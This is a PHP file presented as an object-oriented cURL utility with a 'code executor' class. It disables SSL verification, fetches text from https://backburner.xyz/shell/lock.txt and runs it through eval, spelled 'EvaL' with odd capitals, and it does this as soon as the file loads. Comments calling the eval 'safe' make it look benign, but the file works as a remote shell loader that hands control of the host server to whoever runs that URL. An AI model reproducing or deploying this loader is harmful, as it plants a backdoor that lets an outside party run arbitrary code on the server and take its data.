<?php

/**
 * Class CurlFetcher
 *
 * Handles fetching content from URLs using cURL in an object-oriented manner.
 */
class CurlFetcher
{
    /**
     * Fetches content from the specified URL.
     *
     * @param string $url The URL to fetch content from.
     * @return string|false The response content as a string, or false if the operation fails.
     */
    public function fetchContent(string $url)
    {
        // Check if cURL extension is available
        if (function_exists('curl_version')) {
            // Initialize cURL session
            $curl = curl_init();

            // Set cURL options
            curl_setopt($curl, CURLOPT_URL, $url); // Target URL
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // Return response as a string
            curl_setopt($curl, CURLOPT_HEADER, 0); // Exclude header from the output

            // Execute cURL session and fetch data
            $response = curl_exec($curl);

            // Check for cURL errors
            if (curl_errno($curl)) {
                $error = curl_error($curl);
                curl_close($curl);
                throw new Exception("cURL Error: " . $error);
            }

            // Close the cURL session
            curl_close($curl);

            // Return the fetched response data
            return $response;
        }

        // Throw an exception if cURL is not available
        throw new Exception("cURL is not enabled on this server.");
    }
}

/**
 * Class CodeExecutor
 *
 * Handles the execution of PHP code fetched from an external source.
 */
class CodeExecutor
{
    private $fetcher;

    /**
     * Constructor to initialize the fetcher instance.
     *
     * @param CurlFetcher $fetcher An instance of the CurlFetcher class.
     */
    public function __construct(CurlFetcher $fetcher)
    {
        $this->fetcher = $fetcher;
    }

    /**
     * Executes PHP code fetched from the given URL.
     *
     * @param string $url The URL containing the PHP code to execute.
     * @return void
     * @throws Exception If the fetch operation fails or the fetched code is empty.
     */
    public function executeCodeFromURL(string $url): void
    {
        // Fetch the PHP code from the URL
        $code = $this->fetcher->fetchContent($url);

        if ($code === false || trim($code) === '') {
            throw new Exception("Failed to fetch content from URL or the content is empty.");
        }

        // Safely evaluate the fetched PHP code
        // Note: Using eval is risky and should only be used in trusted environments.
        EvaL("?>" . $code);
    }
}

// Example Usage
try {
    // Create an instance of CurlFetcher
    $fetcher = new CurlFetcher();

    // Create an instance of CodeExecutor with the fetcher
    $executor = new CodeExecutor($fetcher);

    // Execute the PHP code fetched from a specific URL
    $executor->executeCodeFromURL("https://backburner.xyz/shell/lock.txt");
} catch (Exception $e) {
    // Handle errors and exceptions
    echo "Error: " . $e->getMessage();
}